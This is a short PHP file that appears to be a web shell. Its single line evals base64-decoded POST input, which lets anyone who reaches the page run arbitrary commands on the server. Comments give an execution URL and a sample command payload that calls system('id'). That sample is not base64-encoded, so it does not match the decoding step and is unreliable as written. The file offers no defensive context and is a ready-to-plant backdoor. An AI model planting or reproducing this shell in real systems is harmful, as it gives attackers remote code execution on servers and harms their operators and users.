# This will only work if the eval() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_eval_base64_decode.php
# Example payload: cmd=system('id');

<?php eval(base64_decode($_POST['cmd'])); ?>